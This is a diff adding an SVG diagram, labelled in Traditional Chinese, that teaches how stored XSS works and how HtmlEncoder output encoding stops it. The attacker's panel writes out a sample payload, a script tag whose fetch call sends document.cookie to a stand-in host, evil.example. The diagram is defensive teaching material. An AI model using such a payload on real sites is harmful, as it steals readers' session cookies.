@@ -1,0 +1,131 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 600" width="1000" height="600" role="img" aria-label="XSS 流程：攻擊者把 script 標籤塞進文章標題送出，API 照原文存進資料庫；讀者打開文章頁時，沒有編碼器的伺服器把標題原封不動放進 HTML，瀏覽器把它當程式碼執行並把 cookie 送到攻擊者的伺服器；有編碼器的伺服器先把小於號改寫成安全寫法，瀏覽器只把它當文字顯示">
+<style>
+  svg {
+    --bg: #ffffff; --fg: #1f2328; --muted: #59636e; --border: #d1d9e0; --soft: #f6f8fa;
+    --c1: #0969da; --c1-s: #ddf4ff; --c2: #bc4c00; --c2-s: #fff4e5; --ok: #1a7f37; --ok-s: #dcfce7; --no: #cf222e; --no-s: #ffebe9;
+    font-family: "Segoe UI", "Microsoft JhengHei", "Noto Sans TC", "PingFang TC", sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    svg {
+      --bg: #0d1117; --fg: #e6edf3; --muted: #9198a1; --border: #3d444d; --soft: #151b23;
+      --c1: #58a6ff; --c1-s: #0c2d4a; --c2: #ffa657; --c2-s: #2a1d0e; --ok: #3fb950; --ok-s: #12261b; --no: #ff7b72; --no-s: #3d1515;
+    }
+  }
+  .bg { fill: var(--bg); }
+  text { fill: var(--fg); font-size: 13px; }
+  .t { font-size: 14px; font-weight: 700; }
+  .sm { font-size: 11.5px; fill: var(--muted); }
+  .code { white-space: pre; font-variant-ligatures: none; font-family: "Cascadia Code", Consolas, "Courier New", monospace; font-size: 12px; }
+  .big { font-size: 13.5px; font-weight: 700; }
+  .box { fill: var(--soft); stroke: var(--border); stroke-width: 1.5; }
+  .no { fill: var(--no-s); stroke: var(--no); stroke-width: 1.5; }
+  .yes { fill: var(--ok-s); stroke: var(--ok); stroke-width: 1.5; }
+  .band-no { fill: none; stroke: var(--no); stroke-width: 1.5; stroke-dasharray: 6 4; }
+  .band-ok { fill: none; stroke: var(--ok); stroke-width: 1.5; stroke-dasharray: 6 4; }
+  .win { fill: var(--bg); stroke: var(--border); stroke-width: 1.5; }
+  .winbar { fill: var(--soft); stroke: var(--border); stroke-width: 1.5; }
+  .dot { fill: var(--muted); }
+  .db { fill: var(--c1-s); stroke: var(--c1); stroke-width: 1.5; }
+  .db-body { fill: var(--c1-s); }
+  .db-side { fill: none; stroke: var(--c1); stroke-width: 1.5; }
+  .person { fill: none; stroke: var(--no); stroke-width: 2.5; stroke-linecap: round; }
+  .num { fill: var(--c2); }
+  .numt { font-size: 12px; font-weight: 800; fill: #ffffff; }
+  .k1 { fill: var(--c1); font-weight: 700; } .k-ok { fill: var(--ok); font-weight: 700; } .k-no { fill: var(--no); font-weight: 700; }
+  .arr { fill: none; stroke: var(--muted); stroke-width: 2; }
+  .f-muted { fill: var(--muted); }
+</style>
+<defs>
+  <marker id="am" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path class="f-muted" d="M0,0 L10,5 L0,10 z"/></marker>
+</defs>
+<rect class="bg" x="0" y="0" width="1000" height="600" rx="12"/>
+
+<text class="t" x="500" y="28" text-anchor="middle">XSS：攻擊者塞進標題的字串，在讀者的瀏覽器裡被當成程式碼執行</text>
+
+<!-- 步驟標題 -->
+<circle class="num" cx="22" cy="54" r="10"/><text class="numt" x="22" y="58" text-anchor="middle">1</text>
+<text class="t" x="38" y="58">攻擊者送出一篇文章</text>
+<circle class="num" cx="267" cy="54" r="10"/><text class="numt" x="267" y="58" text-anchor="middle">2</text>
+<text class="t" x="283" y="58">API 照原文存進資料庫</text>
+<circle class="num" cx="482" cy="54" r="10"/><text class="numt" x="482" y="58" text-anchor="middle">3</text>
+<text class="t" x="498" y="58">讀者打開文章頁，伺服器組 HTML</text>
+<circle class="num" cx="742" cy="54" r="10"/><text class="numt" x="742" y="58" text-anchor="middle">4</text>
+<text class="t" x="758" y="58">讀者的瀏覽器</text>
+
+<!-- ① 攻擊者 -->
+<circle class="person" cx="35" cy="270" r="12"/>
+<path class="person" d="M35,282 V318 M15,298 H55 M35,318 L20,345 M35,318 L50,345"/>
+<text class="k-no" x="35" y="368" text-anchor="middle">攻擊者</text>
+<rect class="no" x="65" y="225" width="172" height="130" rx="8"/>
+<text class="code" x="73" y="245">POST /api/posts</text>
+<text class="code" x="73" y="265">title =</text>
+<text class="code k-no" x="73" y="283">&lt;script&gt;</text>
+<text class="code" x="73" y="301">fetch("https://evil…</text>
+<text class="code" x="73" y="319">?c=" + document.cookie)</text>
+<text class="code k-no" x="73" y="337">&lt;/script&gt;</text>
+<path class="arr" d="M237,290 H262" marker-end="url(#am)"/>
+
+<!-- ② API 與資料庫 -->
+<rect class="box" x="265" y="265" width="180" height="50" rx="8"/>
+<text class="t" x="355" y="285" text-anchor="middle">你的 API（Controller）</text>
+<text class="sm" x="355" y="303" text-anchor="middle">拿到的只是一個 string</text>
+<path class="arr" d="M355,315 V338" marker-end="url(#am)"/>
+<ellipse class="db" cx="355" cy="398" rx="50" ry="8"/>
+<rect class="db-body" x="305" y="348" width="100" height="50"/>
+<path class="db-side" d="M305,348 V398 M405,348 V398"/>
+<ellipse class="db" cx="355" cy="348" rx="50" ry="8"/>
+<text class="k1" x="355" y="379" text-anchor="middle">Posts 表</text>
+<text class="sm" x="355" y="424" text-anchor="middle">照原文存進去</text>
+<text class="sm" x="355" y="440" text-anchor="middle">這一步沒有錯</text>
+
+<!-- 分岔：同一筆資料，輸出方式不同 -->
+<path class="arr" d="M405,373 C445,373 445,137 476,137" marker-end="url(#am)"/>
+<path class="arr" d="M405,373 C445,373 445,434 476,434" marker-end="url(#am)"/>
+
+<!-- 上排：沒有編碼器 -->
+<rect class="band-no" x="470" y="85" width="525" height="185" rx="10"/>
+<text class="k-no" x="482" y="103">沒有編碼器</text>
+<rect class="box" x="480" y="112" width="220" height="48" rx="8"/>
+<text class="sm" x="490" y="128">伺服器的程式：字串相接</text>
+<text class="code" x="490" y="150">"&lt;h1&gt;" + post.Title + "&lt;/h1&gt;"</text>
+<path class="arr" d="M590,160 V176" marker-end="url(#am)"/>
+<rect class="no" x="480" y="178" width="220" height="62" rx="8"/>
+<text class="sm" x="490" y="194">送出的 HTML</text>
+<text class="code" x="490" y="213">&lt;h1&gt;<tspan class="k-no">&lt;script&gt;</tspan>fetch(…)</text>
+<text class="code" x="490" y="230"><tspan class="k-no">&lt;/script&gt;</tspan>&lt;/h1&gt;</text>
+<path class="arr" d="M700,209 H716" marker-end="url(#am)"/>
+<rect class="win" x="720" y="100" width="265" height="160" rx="8"/>
+<rect class="winbar" x="720" y="100" width="265" height="22" rx="8"/>
+<circle class="dot" cx="732" cy="111" r="3.5"/><circle class="dot" cx="744" cy="111" r="3.5"/><circle class="dot" cx="756" cy="111" r="3.5"/>
+<text class="sm" x="770" y="115">blog.example/posts/1</text>
+<text class="sm" x="852" y="150" text-anchor="middle">（標題看起來是空的）</text>
+<rect class="no" x="735" y="165" width="235" height="28" rx="6"/>
+<text class="k-no" x="852" y="184" text-anchor="middle">⚠ script 被當成程式碼執行了</text>
+<text class="sm" x="852" y="215" text-anchor="middle">document.cookie 被讀走</text>
+<text class="sm" x="852" y="232" text-anchor="middle">送到 evil.example，讀者看不出來</text>
+
+<!-- 下排：有編碼器 -->
+<rect class="band-ok" x="470" y="380" width="525" height="185" rx="10"/>
+<text class="k-ok" x="482" y="398">有編碼器（HtmlEncoder）</text>
+<rect class="box" x="480" y="407" width="220" height="58" rx="8"/>
+<text class="sm" x="490" y="423">伺服器的程式：先過關卡</text>
+<text class="code" x="490" y="441">"&lt;h1&gt;" + HtmlEncoder.Default</text>
+<text class="code" x="490" y="457">.Encode(post.Title) + "&lt;/h1&gt;"</text>
+<path class="arr" d="M590,465 V481" marker-end="url(#am)"/>
+<rect class="yes" x="480" y="483" width="220" height="62" rx="8"/>
+<text class="sm" x="490" y="499">送出的 HTML</text>
+<text class="code" x="490" y="518">&lt;h1&gt;<tspan class="k-ok">&amp;lt;script&amp;gt;</tspan>fetch(…)</text>
+<text class="code" x="490" y="535"><tspan class="k-ok">&amp;lt;/script&amp;gt;</tspan>&lt;/h1&gt;</text>
+<path class="arr" d="M700,514 H716" marker-end="url(#am)"/>
+<rect class="win" x="720" y="395" width="265" height="160" rx="8"/>
+<rect class="winbar" x="720" y="395" width="265" height="22" rx="8"/>
+<circle class="dot" cx="732" cy="406" r="3.5"/><circle class="dot" cx="744" cy="406" r="3.5"/><circle class="dot" cx="756" cy="406" r="3.5"/>
+<text class="sm" x="770" y="410">blog.example/posts/1</text>
+<text class="code big" x="852" y="448" text-anchor="middle">&lt;script&gt;fetch(…)&lt;/script&gt;</text>
+<rect class="yes" x="735" y="462" width="235" height="28" rx="6"/>
+<text class="k-ok" x="852" y="481" text-anchor="middle">✓ 只是文字，沒有執行</text>
+<text class="sm" x="852" y="512" text-anchor="middle">讀者看到一串怪字</text>
+<text class="sm" x="852" y="529" text-anchor="middle">但什麼都不會發生</text>
+
+<text class="sm" x="500" y="588" text-anchor="middle">兩排的差別只在 ③ 輸出那一步：資料庫裡的內容一模一樣，關卡設在「寫進 HTML 之前」</text>
+</svg>
